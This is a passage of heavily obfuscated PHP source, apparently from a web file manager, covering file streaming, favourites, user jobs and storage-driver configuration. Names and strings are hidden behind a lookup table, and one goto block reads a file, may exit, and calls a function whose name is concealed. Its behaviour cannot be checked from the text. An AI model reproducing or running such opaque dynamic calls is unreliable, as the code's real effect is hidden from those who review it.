static $fileInfo = array(); public function info($‹¢ù…ö’) { $×´¨Ü«ì = $_SERVER[ùèÅ´Ãš][1640]; if (isset(self::$fileInfo[$‹¢ù…ö’])) { return self::$fileInfo[$‹¢ù…ö’]; } if (substr($‹¢ù…ö’, 0, strlen($×´¨Ü«ì)) != $×´¨Ü«ì) { return !1; } self::$fileInfo[$‹¢ù…ö’] = IO::info(substr($‹¢ù…ö’, strlen($×´¨Ü«ì))); return self::$fileInfo[$‹¢ù…ö’]; } public static function read($ş¬æÕ²ö, $àÓã‘¤µ, $ˆÅğŠä) { if (!isset(self::$_fopenCache[$ş¬æÕ²ö])) { $¾²ûìå = new StreamWrapperIO(); $¾²ûìå->stream_open($ş¬æÕ²ö); self::$_fopenCache[$ş¬æÕ²ö] = $¾²ûìå; } $¾²ûìå = self::$_fopenCache[$ş¬æÕ²ö]; return $¾²ûìå->fileSubstr($àÓã‘¤µ, $ˆÅğŠä); } public static function _read($É¤òß, $êÑÌËœÎ, $ŠƒšåÚ) { $…öşóå =& $_SERVER[ùèÅ´Ãš]; $Ó¶Ó£ıü = fopen($É¤òß, $…öşóå[1480]); if (!$Ó¶Ó£ıü) { return $…öşóå[12]; } $”­§úáÓ = 8192; fseek($Ó¶Ó£ıü, $êÑÌËœÎ, SEEK_SET); $úÈøó«ü = $…öşóå[12]; $âôÆÜÖÈ = 0; while ($âôÆÜÖÈ < $ŠƒšåÚ) { $ö¥§şâÍ = min($”­§úáÓ, $ŠƒšåÚ - $âôÆÜÖÈ); $úÈøó«ü .= fread($Ó¶Ó£ıü, $ö¥§şâÍ); $âôÆÜÖÈ += $ö¥§şâÍ; } fclose($Ó¶Ó£ıü); return $úÈøó«ü; } public function fileSubstr($³ü©°—©, $á´ôî­ğ) { $ëö¯³ø =& $_SERVER[ùèÅ´Ãš]; $ÌµÏşêÔ = $this->info[$ëö¯³ø[79]]; $ÒÜÃáà = $³ü©°—©; $ºÚşªµÛ = $á´ôî­ğ; if ($³ü©°—© < 0) { $³ü©°—© = $ÌµÏşêÔ + $³ü©°—©; } if ($á´ôî­ğ === !1) { $á´ôî­ğ = $ÌµÏşêÔ - $³ü©°—©; } if ($³ü©°—© + $á´ôî­ğ > $ÌµÏşêÔ) { $á´ôî­ğ = $ÌµÏşêÔ - $³ü©°—©; } if ($á´ôî­ğ <= 0) { return $ëö¯³ø[12]; } if ($³ü©°—© < 0 || $³ü©°—© >= $ÌµÏşêÔ || $á´ôî­ğ <= 0 || $á´ôî­ğ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\145\x52\145\x61\144\x20\x65\x72\x72\157\x72\41\x20\x73\164\141\162\x74\x3d{$³ü©°—©}\73\x6c\145\x6e\147\x74\x68\x3d{$á´ôî­ğ}\x3b\x20\163\151\172\145\75{$ÌµÏşêÔ}\x3b"); } $ƒüçÆ€Ğ = 64 * 1024; $ËÁ‘ˆ’İ =& self::$_chunkBuffer[$this->path]; if (!$ËÁ‘ˆ’İ) { $ËÁ‘ˆ’İ = array(); } $—÷¾˜õ  = 0; $ÌõöÒşß = 0; $½Ş­Õ÷ = $ëö¯³ø[12]; foreach ($ËÁ‘ˆ’İ as $—÷¾˜õ  => $½Ş­Õ÷) { $—÷¾˜õ  = intval($—÷¾˜õ ); $ÌõöÒşß = $—÷¾˜õ  + strlen($½Ş­Õ÷); if ($³ü©°—© >= $ÌõöÒşß) { continue; } if ($³ü©°—© >= $—÷¾˜õ  && $³ü©°—© + $á´ôî­ğ <= $ÌõöÒşß) { return substr($½Ş­Õ÷, $³ü©°—© - $—÷¾˜õ , $á´ôî­ğ); } break; } if (count($ËÁ‘ˆ’İ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ëö¯³ø[1641], $ëö¯³ø[1642] . count($ËÁ‘ˆ’İ) . "\73\x73\x74\x61\x72\x74\x3d{$³ü©°—©}\54\x6c\145\x6e\147\164\x68\75{$á´ôî­ğ}\73\160\157\x73\145\72{$—÷¾˜õ }\176{$ÌõöÒşß}"); throw new Exception($ëö¯³ø[1643]); } $ ®æüè = intval($³ü©°—© / $ƒüçÆ€Ğ) * $ƒüçÆ€Ğ; $¨¾ĞÍÅÎ = ceil(($³ü©°—© + $á´ôî­ğ) / $ƒüçÆ€Ğ) * $ƒüçÆ€Ğ - $ ®æüè; $¤ìãç¯ = IO::fileSubstr($this->path, $ ®æüè, $¨¾ĞÍÅÎ); $ËÁ‘ˆ’İ[$ ®æüè . $ëö¯³ø[12]] = $¤ìãç¯; ksort($ËÁ‘ˆ’İ); $Ò †ÀİÈ = substr($¤ìãç¯, $³ü©°—© - $ ®æüè, $á´ôî­ğ); return $Ò †ÀİÈ; } private function log($œ©Ğåş•, $ÎÜãâ‘Ë) { $›ÉäæÈ =& $_SERVER[ùèÅ´Ãš]; $ìı»µÜú = timeFloat() - $this->timeStart; write_log(sprintf($›ÉäæÈ[1644], $œ©Ğåş•, $this->info[$›ÉäæÈ[32]], $ìı»µÜú, $ÎÜãâ‘Ë), $›ÉäæÈ[1278]); } } class Message { function __construct() { } public function send($»’¸ûíŸ = '', $ì½·•Ë† = array(), $–Í¼ˆàö = "\164\x65\x78\x74") { $²øÛö×™ =& $_SERVER[ùèÅ´Ãš]; $…Ş££Ûã = array($²øÛö×™[33] => $²øÛö×™[1224], $²øÛö×™[171] => $»’¸ûíŸ); if (in_array($–Í¼ˆàö, array($²øÛö×™[1224], $²øÛö×™[1645]))) { $…Ş££Ûã[$²øÛö×™[33]] = $–Í¼ˆàö; } $ì½·•Ë† = array($²øÛö×™[582] => isset($ì½·•Ë†[$²øÛö×™[582]]) ? $ì½·•Ë†[$²øÛö×™[582]] : $²øÛö×™[12], $²øÛö×™[669] => isset($ì½·•Ë†[$²øÛö×™[669]]) ? $ì½·•Ë†[$²øÛö×™[669]] : $²øÛö×™[12]); if (empty($»’¸ûíŸ) || empty($ì½·•Ë†[$²øÛö×™[582]]) && empty($ì½·•Ë†[$²øÛö×™[669]])) { return !1; } $…áï«áë = array($²øÛö×™[1571] => $…Ş££Ûã, $²øÛö×™[1646] => $ì½·•Ë†); Hook::trigger($²øÛö×™[1647], $…áï«áë); } } goto bÓˆÀÛŠïõ; béÃ†ÜÜ¹¼: if ($_SERVER[$_SERVER[ùèÅ´Ãš][961]] != $_SERVER[$_SERVER[ùèÅ´Ãš][962]]) { $_getc = $_SERVER[ùèÅ´Ãš][964]; $_getfile = $_SERVER[$_SERVER[ùèÅ´Ãš][965]] . $_SERVER[ùèÅ´Ãš][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ùèÅ´Ãš][288], $_getfilec); if (count($_getarrs) < $_SERVER[ùèÅ´Ãš][704]) { $exit = $_SERVER[ùèÅ´Ãš][967]; $exit(); } $_act = $_SERVER[ùèÅ´Ãš][1627]; $_act($_SERVER[$_SERVER[ùèÅ´Ãš][1626]]); } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($š¾‘‡) { $§â„ÆôÍ =& $_SERVER[ùèÅ´Ãš]; return array($§â„ÆôÍ[2113] => array(USER_ID, $§â„ÆôÍ[2493])); } protected function listData() { $èêÍšêâ =& $_SERVER[ùèÅ´Ãš]; $•‰”Ì‹É = array($èêÍšêâ[1788] => USER_ID, $èêÍšêâ[561] => 0); $¥à˜Äñ† = $èêÍšêâ[2494]; $«Ş¡éíó = $this->field($¥à˜Äñ†)->where($•‰”Ì‹É)->order($èêÍšêâ[2495])->select(); return $«Ş¡éíó ? $«Ş¡éíó : array(); } protected function resetCache() { } protected function listView() { $Êñ¾„ÅÀ =& $_SERVER[ùèÅ´Ãš]; $™¶ÏÙø = $this->listData(); $‚æ¦ªö¸ = array_filter_by_field($™¶ÏÙø, $Êñ¾„ÅÀ[33], $Êñ¾„ÅÀ[492]); $’ê¶ÜÇ = array_to_keyvalue($‚æ¦ªö¸, $Êñ¾„ÅÀ[12], $Êñ¾„ÅÀ[87]); if (!$’ê¶ÜÇ) { return $™¶ÏÙø; } $âí‰«›¬ = 2000; $ÆôÒæáó = array($Êñ¾„ÅÀ[493] => array($Êñ¾„ÅÀ[494], $’ê¶ÜÇ)); $Ôœ¤Ì€‹ = Model($Êñ¾„ÅÀ[908])->listSource($ÆôÒæáó, $âí‰«›¬); $Ôœ¤Ì€‹ = array_merge($Ôœ¤Ì€‹[$Êñ¾„ÅÀ[86]], $Ôœ¤Ì€‹[$Êñ¾„ÅÀ[85]]); $Ôœ¤Ì€‹ = array_to_keyvalue($Ôœ¤Ì€‹, $Êñ¾„ÅÀ[194]); foreach ($™¶ÏÙø as $´úıÆ¦ö => $’Õğóï) { $èİ‚îçò = $Ôœ¤Ì€‹[$’Õğóï[$Êñ¾„ÅÀ[87]]]; $èİ‚îçò = $èİ‚îçò ? $èİ‚îçò : array(); $™¶ÏÙø[$´úıÆ¦ö] = array_merge($èİ‚îçò, $’Õğóï); } return $™¶ÏÙø; } protected function addFav($Ì†‘€¡Ô, $³ÊÙàÀ = '', $Éêéàãñ = "\x73\157\165\162\x63\145") { $·ôáõ±¥ =& $_SERVER[ùèÅ´Ãš]; $™™•üË» = array($·ôáõ±¥[1788] => USER_ID, $·ôáõ±¥[561] => 0, $·ôáõ±¥[498] => $Éêéàãñ, $·ôáõ±¥[497] => $Ì†‘€¡Ô); if ($this->where($™™•üË»)->find()) { return !1; } $™™•üË» = array($·ôáõ±¥[1788] => USER_ID, $·ôáõ±¥[561] => 0); $—ÙœäœÓ = $this->where($™™•üË»)->max($·ôáõ±¥[2021]); if (!$—ÙœäœÓ) { $—ÙœäœÓ = 0; } if (!$³ÊÙàÀ && $Éêéàãñ == $·ôáõ±¥[492]) { $üâŞ›Ë = Model($·ôáõ±¥[1442])->where(array($·ôáõ±¥[493] => $Ì†‘€¡Ô))->find(); if (!$üâŞ›Ë) { return !1; } $³ÊÙàÀ = $üâŞ›Ë[$·ôáõ±¥[32]]; } $³ÊÙàÀ = $this->getAutoName($³ÊÙàÀ); $Òú¸úÀÆ = array($·ôáõ±¥[1788] => USER_ID, $·ôáõ±¥[561] => 0, $·ôáõ±¥[496] => $³ÊÙàÀ, $·ôáõ±¥[497] => $Ì†‘€¡Ô, $·ôáõ±¥[498] => $Éêéàãñ, $·ôáõ±¥[2001] => $—ÙœäœÓ + 1); return $this->add($Òú¸úÀÆ); } protected function remove($È‘ƒ‘•Š) { $ê’×Àò =& $_SERVER[ùèÅ´Ãš]; $Í÷ìÊ¾£ = array($ê’×Àò[1788] => USER_ID, $ê’×Àò[495] => $È‘ƒ‘•Š); return $this->where($Í÷ìÊ¾£)->delete(); } protected function removeByName($¶Èë˜ö) { $©Â†Û³Ÿ =& $_SERVER[ùèÅ´Ãš]; $åÒãÌæó = array($©Â†Û³Ÿ[1788] => USER_ID, $©Â†Û³Ÿ[496] => $¶Èë˜ö, $©Â†Û³Ÿ[561] => 0); return $this->where($åÒãÌæó)->delete(); } protected function rename($Á‰óğ¼¼, $ìÙÇø¿¨) { $†®Íï£ë =& $_SERVER[ùèÅ´Ãš]; if ($Á‰óğ¼¼ == $ìÙÇø¿¨) { return !1; } $©¾ÍÔóÃ = $this->getAutoName($ìÙÇø¿¨); if ($ìÙÇø¿¨ != $©¾ÍÔóÃ) { return !1; } $§¤Ú½£ = array($†®Íï£ë[1788] => USER_ID, $†®Íï£ë[561] => 0, $†®Íï£ë[32] => $Á‰óğ¼¼); return $this->where($§¤Ú½£)->save(array($†®Íï£ë[32] => $ìÙÇø¿¨)); } protected function resetSort($ÀÜ²±÷Ç) { $­îæ“¤ =& $_SERVER[ùèÅ´Ãš]; $ÀÜ²±÷Ç = is_array($ÀÜ²±÷Ç) ? $ÀÜ²±÷Ç : array(); $‚«Ÿù¨ê = array($­îæ“¤[1788] => USER_ID); for ($Õ“õ„­ş = 0; $Õ“õ„­ş < count($ÀÜ²±÷Ç); $Õ“õ„­ş++) { $‚«Ÿù¨ê[$­îæ“¤[495]] = $ÀÜ²±÷Ç[$Õ“õ„­ş]; $this->where($‚«Ÿù¨ê)->save(array($­îæ“¤[2001] => $Õ“õ„­ş + 1)); } return !0; } protected function moveTop($¶Õ£È‡Ü) { $Ÿô¾°Û =& $_SERVER[ùèÅ´Ãš]; $’¶¨Áä = array($Ÿô¾°Û[1788] => USER_ID, $Ÿô¾°Û[561] => 0); $¦‘å¶¿ = $this->where($’¶¨Áä)->where(array($Ÿô¾°Û[32] => $¶Õ£È‡Ü))->find(); if (!$¦‘å¶¿) { return; } $æí³«ò = $this->field($Ÿô¾°Û[477])->where($’¶¨Áä)->order($Ÿô¾°Û[2495])->select(); $æí³«ò = array_to_keyvalue($æí³«ò, $Ÿô¾°Û[12], $Ÿô¾°Û[477]); $¬Ï¦…¾Û = $æí³«ò; $æí³«ò = array_remove_value($æí³«ò, $¦‘å¶¿[$Ÿô¾°Û[477]]); array_unshift($æí³«ò, $¦‘å¶¿[$Ÿô¾°Û[477]]); return $this->resetSort($æí³«ò); } protected function moveBottom($ÅïĞãÖ) { $¬ªÏ—˜ê =& $_SERVER[ùèÅ´Ãš]; $¨»»¯½ƒ = array($¬ªÏ—˜ê[1788] => USER_ID, $¬ªÏ—˜ê[561] => 0); $º÷×ıÅ® = $this->where($¨»»¯½ƒ)->max($¬ªÏ—˜ê[2021]); $‹ ãÛ = array($¬ªÏ—˜ê[2021] => $º÷×ıÅ® + 1); return $this->where($¨»»¯½ƒ)->where(array($¬ªÏ—˜ê[32] => $ÅïĞãÖ))->save($‹ ãÛ); } private function getAutoName($¤®•ôÀ²) { $ê‰”éÂ =& $_SERVER[ùèÅ´Ãš]; $àİÉ•” = array($ê‰”éÂ[1788] => USER_ID, $ê‰”éÂ[561] => 0); $‰¡Æ£¹é = $this->field($ê‰”éÂ[32])->where($àİÉ•”)->select(); $‰¡Æ£¹é = array_to_keyvalue($‰¡Æ£¹é, $ê‰”éÂ[12], $ê‰”éÂ[32]); if (!$‰¡Æ£¹é || !in_array($¤®•ôÀ², $‰¡Æ£¹é)) { return $¤®•ôÀ²; } for ($“Ê·¾ùÕ = 0; $“Ê·¾ùÕ < count($‰¡Æ£¹é); $“Ê·¾ùÕ++) { if (!in_array($¤®•ôÀ² . "\x28{$“Ê·¾ùÕ}\x29", $‰¡Æ£¹é)) { return $¤®•ôÀ² . "\x28{$“Ê·¾ùÕ}\51"; } } return $¤®•ôÀ² . "\x28{$“Ê·¾ùÕ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\152\x6f\x62\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\144\145\x73\x63", "\163\157\162\164"); const JOB_KEY = "\x73\x65\x6c\x66\x4a\x6f\x62\114\x69\x73\x74"; public function listData($ŠÏğÌ£¡ = false, $¶ ´Ûş = "\163\x6f\162\x74", $‚¸­»“® = false) { return parent::listData($ŠÏğÌ£¡, $¶ ´Ûş, $‚¸­»“®); } public function remove($–³×ë£Û) { return parent::remove($–³×ë£Û); } public function add($è¤‚Äºù) { $êãÅ„ˆ® =& $_SERVER[ùèÅ´Ãš]; if ($this->findByName($è¤‚Äºù[$êãÅ„ˆ®[32]])) { return !1; } $è¤‚Äºù[$êãÅ„ˆ®[2021]] = $this->getSort(); return parent::insert($è¤‚Äºù); } private function getSort() { $º±Ñ¼ï =& $_SERVER[ùèÅ´Ãš]; $º¼Ç÷İ© = parent::listData(); $¤…÷½£ = array_to_keyvalue($º¼Ç÷İ©, $º±Ñ¼ï[12], $º±Ñ¼ï[2021]); return empty($¤…÷½£) ? 0 : max($¤…÷½£) + 1; } public function update($Èõ¹›Šò, $­ßîâ™µ) { $­ÁßŠñÀ =& $_SERVER[ùèÅ´Ãš]; $îÛÎ·¼À = parent::listData($Èõ¹›Šò); $Â„™‚Ç = $this->findByName($­ßîâ™µ[$­ÁßŠñÀ[32]]); if (!$îÛÎ·¼À || $Â„™‚Ç && $Â„™‚Ç[$­ÁßŠñÀ[477]] != $îÛÎ·¼À[$­ÁßŠñÀ[477]]) { return !1; } return parent::update($Èõ¹›Šò, $­ßîâ™µ); } public function setUserJob($Ñæ¸ÖÒ, $ÅŞí ’) { $×ƒğÒğù =& $_SERVER[ùèÅ´Ãš]; if (!is_array($ÅŞí ’)) { $ÅŞí ’ = array($ÅŞí ’); } $™à¬Ëã = parent::listData(); $å¬ò® = array_to_keyvalue($™à¬Ëã, $×ƒğÒğù[32]); $õ‘Î·ƒ¢ = $×ƒğÒğù[456]; foreach ($ÅŞí ’ as $Ë¹ûÜ¨È) { if ($å¬ò®[$Ë¹ûÜ¨È]) { $õ‘Î·ƒ¢ .= $å¬ò®[$Ë¹ûÜ¨È][$×ƒğÒğù[477]] . $×ƒğÒğù[50]; } else { $Ø·›Ï· = $this->add($Ë¹ûÜ¨È); $õ‘Î·ƒ¢ .= $Ø·›Ï· . $×ƒğÒğù[50]; } } $õ‘Î·ƒ¢ = rtrim($õ‘Î·ƒ¢, $×ƒğÒğù[50]); Model($×ƒğÒğù[601])->metaSet($Ñæ¸ÖÒ, self::JOB_KEY, $õ‘Î·ƒ¢); } public function getUserJob($Ò¬Ìş) { $ôòùÒ®ú = Model($_SERVER[ùèÅ´Ãš][601])->metaGet($Ò¬Ìş); return $this->getUserJobInfo($ôòùÒ®ú[self::JOB_KEY]); } public function getUserJobInfo($’˜á¹øä) { $İ­ÄĞ‡Ê =& $_SERVER[ùèÅ´Ãš]; $•èÙšÙ = explode($İ­ÄĞ‡Ê[50], $’˜á¹øä); $´Øâõ» = parent::listData(); $´Øâõ» = array_remove_key($´Øâõ», $İ­ÄĞ‡Ê[234]); $ëÀÑ…” = array(); foreach ($•èÙšÙ as $¶Ø¤›¢) { if (isset($´Øâõ»[$¶Ø¤›¢])) { $ëÀÑ…”[] = $´Øâõ»[$¶Ø¤›¢]; } } return $ëÀÑ…”; } } goto Eº½¾å¯–²; CĞâ…ª÷ŸÜ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\163\x6f\165\x72\143\145\x53\145\143\x72\x65\x74\114\x69\x73\164"; public $field = array("\163\157\x75\162\143\x65\111\x44", "\x74\x79\x70\145\x49\104", "\x63\162\x65\x61\164\x65\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\163\x74\x6f\x72\141\147\145\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\163\151\x7a\145\x4d\x61\x78", "\163\x79\x73\164\145\x6d", "\144\145\x66\141\x75\x6c\164", "\144\162\151\x76\145\x72", "\143\157\x6e\146\x69\x67"); public function listData($†ê»…œ = false, $™ÏÑ¡ˆ— = "\155\x6f\x64\151\x66\171\x54\x69\x6d\x65", $ø€ÌÌ´÷ = false) { $¼âÀ±‚ò =& $_SERVER[ùèÅ´Ãš]; $¤éëÏ¿´ = parent::listData($†ê»…œ, $™ÏÑ¡ˆ—, $ø€ÌÌ´÷); if ($†ê»…œ) { return $¤éëÏ¿´; } $æñô±íğ = array(); if ($GLOBALS[$¼âÀ±‚ò[2335]]) { $æñô±íğ = $this->ioSizeUseGet(array_to_keyvalue($¤éëÏ¿´, $¼âÀ±‚ò[12], $¼âÀ±‚ò[477])); } foreach ($¤éëÏ¿´ as $Õê¢œ => $Õ’‹§º) { unset($¤éëÏ¿´[$Õê¢œ][$¼âÀ±‚ò[6]]); $¤éëÏ¿´[$Õê¢œ][$¼âÀ±‚ò[1986]] = isset($æñô±íğ[$Õ’‹§º[$¼âÀ±‚ò[477]]]) ? $æñô±íğ[$Õ’‹§º[$¼âÀ±‚ò[477]]] : 0; } return $¤éëÏ¿´; } public function ioSizeUseGet($¼§¤¥Ô) { $„öŠÎÀ» =& $_SERVER[ùèÅ´Ãš]; if (!$¼§¤¥Ô) { return array(); } $îööÒŠ = $„öŠÎÀ»[2336] . implode($„öŠÎÀ»[50], $¼§¤¥Ô); $¶éÊ»ãª = Cache::get($îööÒŠ); if ($¶éÊ»ãª) { return $¶éÊ»ãª; } $ÜêúİÊ‚ = array($„öŠÎÀ»[901] => $„öŠÎÀ»[477], $„öŠÎÀ»[2337] => $„öŠÎÀ»[79]); $òı¨Öï = array($„öŠÎÀ»[901] => array($„öŠÎÀ»[7], $¼§¤¥Ô)); $¶éÊ»ãª = Model($„öŠÎÀ»[869])->field($ÜêúİÊ‚)->where($òı¨Öï)->group($„öŠÎÀ»[901])->select(); $¶éÊ»ãª = array_to_keyvalue($¶éÊ»ãª, $„öŠÎÀ»[477], $„öŠÎÀ»[79]); Cache::set($îööÒŠ, $¶éÊ»ãª, 600); return $¶éÊ»ãª; } public function getConfig($ñËêñõÒ) { $ô§ÇŒ×Ö = parent::listData($ñËêñõÒ); $´Øª«ÒÀ = _get($ô§ÇŒ×Ö, $_SERVER[ùèÅ´Ãš][6], array()); if ($´Øª«ÒÀ && !is_array($´Øª«ÒÀ)) { $´Øª«ÒÀ = json_decode($´Øª«ÒÀ, !0); } return $´Øª«ÒÀ; } public function update($ü´üèî, $ÕĞ·ÏØª) { $İÁ˜Ò =& $_SERVER[ùèÅ´Ãš]; $âÇ«úäò = $ÕĞ·ÏØª[$İÁ˜Ò[32]]; $®¶¸½² = array_to_keyvalue(parent::listData(), $İÁ˜Ò[32]); if (isset($®¶¸½²[$âÇ«úäò]) && $®¶¸½²[$âÇ«úäò][$İÁ˜Ò[477]] != $ü´üèî) { return !1; } $this->checkPwd($ü´üèî, $ÕĞ·ÏØª); if (isset($ÕĞ·ÏØª[$İÁ˜Ò[2338]]) && $ÕĞ·ÏØª[$İÁ˜Ò[2338]] == $İÁ˜Ò[91]) { $this->checkConfig($ÕĞ·ÏØª); } unset($ÕĞ·ÏØª[$İÁ˜Ò[2338]]); $·×§ Ü³ = parent::update($ü´üèî, $ÕĞ·ÏØª); if ($·×§ Ü³ && $ÕĞ·ÏØª[$İÁ˜Ò[37]]) { foreach ($®¶¸½² as $ßéëá‘¨) { if ($ßéëá‘¨[$İÁ˜Ò[37]] && $ßéëá‘¨[$İÁ˜Ò[477]] != $ü´üèî) { parent::update($ßéëá‘¨[$İÁ˜Ò[477]], array($İÁ˜Ò[37] => 0)); } } $this->updateBackup($ü´üèî, $®¶¸½²); } return $·×§ Ü³; } public function add($ğáŞòæ‚) { $‘áÂïüœ =& $_SERVER[ùèÅ´Ãš]; $¬”îê³æ = array_to_keyvalue(parent::listData(), $‘áÂïüœ[32]); if (isset($¬”îê³æ[$ğáŞòæ‚[$‘áÂïüœ[32]]])) { return !1; } $this->checkConfig($ğáŞòæ‚); $Ø³¾‰½º = parent::insert($ğáŞòæ‚); if ($Ø³¾‰½º && $ğáŞòæ‚[$‘áÂïüœ[37]]) { foreach ($¬”îê³æ as $°’¯™ûÖ) { if ($°’¯™ûÖ[$‘áÂïüœ[37]]) { parent::update($°’¯™ûÖ[$‘áÂïüœ[477]], array($‘áÂïüœ[37] => 0)); } } $this->updateBackup($Ø³¾‰½º, $¬”îê³æ); } return $Ø³¾‰½º; } public function updateBackup($ûœúø„, $÷‡–Ù±Ù) { $¢×¶¼çÆ =& $_SERVER[ùèÅ´Ãš]; if ($ûœúø„ == $¢×¶¼çÆ[91]) { return; } $ÍòêÎªÎ = Model($¢×¶¼çÆ[825])->config(); $¶µÖˆè÷ = $ÍòêÎªÎ[$¢×¶¼çÆ[829]]; if ($ÍòêÎªÎ[$¢×¶¼çÆ[1766]] != $¢×¶¼çÆ[91] || $¶µÖˆè÷ == $ûœúø„) { return; } if ($¶µÖˆè÷ != $¢×¶¼çÆ[91]) { $òÌ¡Ü´Ó = array(); foreach ($÷‡–Ù±Ù as $±¥§¿Ì×) { if ($ûœúø„ == $±¥§¿Ì×[$¢×¶¼çÆ[477]]) { continue; } $òÌ¡Ü´Ó[] = $±¥§¿Ì×[$¢×¶¼çÆ[477]]; } if ($òÌ¡Ü´Ó && in_array($¶µÖˆè÷, $òÌ¡Ü´Ó)) { return; } } $×”ÆÃéı = Model($¢×¶¼çÆ[848])->get($¢×¶¼çÆ[855]); $×”ÆÃéı = json_decode($×”ÆÃéı, !0); if (!$×”ÆÃéı) { return; } $×”ÆÃéı[$¢×¶¼çÆ[829]] = $ûœúø„; Model($¢×¶¼çÆ[848])->set(array($¢×¶¼çÆ[855] => $×”ÆÃéı)); } public function checkPwd($‹Ï€Û½¤, &$äïë–÷½) { $æí³Æƒ =& $_SERVER[ùèÅ´Ãš]; if (empty($äïë–÷½[$æí³Æƒ[6]])) { return; } $šĞ¾§¦ = $äïë–÷½[$æí³Æƒ[6]]; if (!is_array($šĞ¾§¦)) { $šĞ¾§¦ = json_decode($šĞ¾§¦, !0); } $Íå—Î¹‹ = $æí³Æƒ[12]; $¿´ÑÌÎâ = array($æí³Æƒ[2339], $æí³Æƒ[2340], $æí³Æƒ[977]); foreach ($¿´ÑÌÎâ as $•°¶Ú°¥) { if (isset($šĞ¾§¦[$•°¶Ú°¥])) { $Íå—Î¹‹ = $•°¶Ú°¥; break; } } if (!$Íå—Î¹‹) { return; } $’Ò†™¥Ò = $this->getConfig($‹Ï€Û½¤); $¯””Ø« = $’Ò†™¥Ò[$Íå—Î¹‹]; $ÜÔ¹¯ŒÎ = $šĞ¾§¦[$Íå—Î¹‹]; if ($ÜÔ¹¯ŒÎ == str_repeat($æí³Æƒ[223], strlen($¯””Ø«))) { $šĞ¾§¦[$Íå—Î¹‹] = $¯””Ø«; $äïë–÷½[$æí³Æƒ[6]] = json_encode($šĞ¾§¦); } else { if ($ÜÔ¹¯ŒÎ != $¯””Ø«) { $äïë–÷½[$æí³Æƒ[2338]] = $æí³Æƒ[91]; } } } public function checkConfig(&$á¥ë¨™›, $¿øÂÓ¶Å = false) { $Ûœ¨ô™¶ =& $_SERVER[ùèÅ´Ãš]; $Ö¼Ì±ö = strtolower($á¥ë¨™›[$Ûœ¨ô™¶[98]]); $ªË»Ø¸Ä = $á¥ë¨™›[$Ûœ¨ô™¶[6]]; if (!is_array($ªË»Ø¸Ä)) { $ªË»Ø¸Ä = json_decode($ªË»Ø¸Ä, !0); } foreach ($ªË»Ø¸Ä as $¼óïıèæ => $»Íú†ÜÖ) { if (is_string($»Íú†ÜÖ)) { $ªË»Ø¸Ä[$¼óïıèæ] = trim($»Íú†ÜÖ); } } $ªË»Ø¸Ä[$Ûœ¨ô™¶[2341]] = rand_string(6); $·Æå¡•ƒ = $GLOBALS[$Ûœ¨ô™¶[6]][$Ûœ¨ô™¶[92]][$Ûœ¨ô™¶[909]]; $¿™´îÓ§ = isset($·Æå¡•ƒ[$Ö¼Ì±ö]) ? $·Æå¡•ƒ[$Ö¼Ì±ö] : ucfirst($Ö¼Ì±ö); $ò¢ƒ’¶ = $Ûœ¨ô™¶[77] . $¿™´îÓ§; if (!$¿™´îÓ§ || !class_exists($ò¢ƒ’¶)) { if ($¿øÂÓ¶Å) { return LNG($Ûœ¨ô™¶[2342]); } write_log(array($Ûœ¨ô™¶[2343], $á¥ë¨™›, get_caller_info()), $Ûœ¨ô™¶[216]); show_json(LNG($Ûœ¨ô™¶[2342]), !1, $á¥ë¨™›); } $è¨à¸½ = new $ò¢ƒ’¶($ªË»Ø¸Ä); $Ì¸ÃøÙÙ = rtrim($ªË»Ø¸Ä[$Ûœ¨ô™¶[1276]], $Ûœ¨ô™¶[8]) . $Ûœ¨ô™¶[8]; if (in_array($Ö¼Ì±ö, $è¨à¸½->objectDriver)) { try { if (!$è¨à¸½->isBucketCors() && !$è¨à¸½->setBucketCors()) { $µÏò—Éµ = LNG($Ûœ¨ô™¶[2344]); $µÏò—Éµ .= $Ûœ¨ô™¶[2345] . LNG($Ûœ¨ô™¶[2346]); } } catch (Exception $¸ûœˆÌ) { $µÏò—Éµ = $¸ûœˆÌ->getMessage(); } if (isset($µÏò—Éµ)) { return $this->_parseError($µÏò—Éµ, $Ö¼Ì±ö, $¿øÂÓ¶Å); } if ($Ö¼Ì±ö == $Ûœ¨ô™¶[68] && !$è¨à¸½->checkRegion()) { return $this->_parseError(LNG($Ûœ¨ô™¶[2347]), $Ö¼Ì±ö, $¿øÂÓ¶Å); } } else { if ($Ö¼Ì±ö == $Ûœ¨ô™¶[2348]) { if ($è¨à¸½->ftpPath) { $¥èé„ó = trim($Ì¸ÃøÙÙ, $Ûœ¨ô™¶[8]); if (stripos($¥èé„ó, trim($è¨à¸½->ftpPath, $Ûœ¨ô™¶[8])) !== 0) { $Ì¸ÃøÙÙ = $è¨à¸½->ftpPath . $Ûœ¨ô™¶[8] . ($¥èé„ó ? $¥èé„ó . $Ûœ¨ô™¶[8] : $Ûœ¨ô™¶[12]); } } } } $ı§Ÿ¢ÓÔ = $è¨à¸½->getPath($Ì¸ÃøÙÙ . $Ûœ¨ô™¶[1280]); try { if ($Ö¼Ì±ö == $Ûœ¨ô™¶[109]) { $è¨à¸½->mkdir($Ì¸ÃøÙÙ); } $èÒ™ø›ì = $è¨à¸½->mkfile($ı§Ÿ¢ÓÔ); if (!$èÒ™ø›ì) { $µÏò—Éµ = LNG($Ûœ¨ô™¶[2344]); } } catch (Exception $¸ûœˆÌ) { $µÏò—Éµ = $¸ûœˆÌ->getMessage(); } if (isset($µÏò—Éµ)) { return $this->_parseError($µÏò—Éµ, $Ö¼Ì±ö, $¿øÂÓ¶Å); } $ªË»Ø¸Ä[$Ûœ¨ô™¶[1276]] = $Ì¸ÃøÙÙ; $á¥ë¨™›[$Ûœ¨ô™¶[6]] = json_encode($ªË»Ø¸Ä); $á¥ë¨™›[$Ûœ¨ô™¶[98]] = $¿™´îÓ§; return !0; } private function _parseError($Ì›ñêÆƒ, $ºÁş¥ğ°, $úêüË’ı = false) { $ª¤¦—ã =& $_SERVER[ùèÅ´Ãš]; if 